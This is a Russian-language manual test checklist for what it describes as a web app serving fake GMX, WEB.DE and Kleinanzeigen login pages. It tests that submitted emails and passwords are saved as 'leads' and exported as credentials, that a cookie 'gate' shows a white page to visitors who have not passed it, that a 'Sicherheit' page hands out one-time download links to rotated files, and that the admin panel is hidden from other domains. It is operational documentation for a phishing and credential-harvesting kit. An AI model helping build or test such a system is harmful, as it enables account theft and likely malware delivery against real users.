# Чеклист ручных сценариев

После изменений в submit/visit/delete/upload или в маршрутизации рекомендуется прогонять сценарии ниже.

## Основной поток (лиды)

- [ ] **Визит:** открыть сайт (GMX/WEB.DE/Klein) с устройства/браузера → в админке появляется новая запись с статусом «Зашел на сайт», платформа определена.
- [ ] **Submit:** на странице входа ввести email и пароль, отправить форму → в той же записи (по visitId) обновились email и пароль, статус изменился.
- [ ] **Отображение в админке:** список лидов обновляется (при наличии WebSocket — без перезагрузки), фильтры по платформе работают, экспорт (Credentials / All emails и т.д.) отдаёт файл.
- [ ] **Удаление:** удалить одну запись и «Удалить все» — в SQLite (`data/database.sqlite`) записи исчезли, админка и API отражают это.

## Короткие ссылки и гейт

- [ ] **Shortlink:** создать короткую ссылку в админке (Config → Shortlinks), открыть `/s/<slug>` → редирект на целевой URL.
- [ ] **Short-домен (гейт):** зайти на short-домен без cookie → отображается гейт/белая страница; после прохождения гейта (cookie установлена) — редирект или выдача страницы входа.

## Скачивание

- [ ] **Страница Sicherheit:** пользователь переходит на /sicherheit, получает ссылку на скачивание (с токеном `?t=...`). Открыть ссылку → файл скачивается. Повторное открытие той же ссылки — 403 или другая обработка (токен одноразовый).
- [ ] **Админка:** загрузка файла в слот (Config → Download), сброс счётчиков, ротация — без ошибок.

## Админка и безопасность

- [ ] **Доступ без токена:** на проде с `NODE_ENV=production` при пустом `ADMIN_TOKEN` сервер не стартует. С токеном — `/admin?token=...` открывает админку.
- [ ] **Домен админки:** запросы к `/admin` и `/api/leads` с другого домена (не ADMIN_DOMAIN и не localhost) → 404.

Запуск автоматических проверок: `npm run check` (синтаксис + Фаза 1), при запущенном сервере — `npm run check:smoke`.
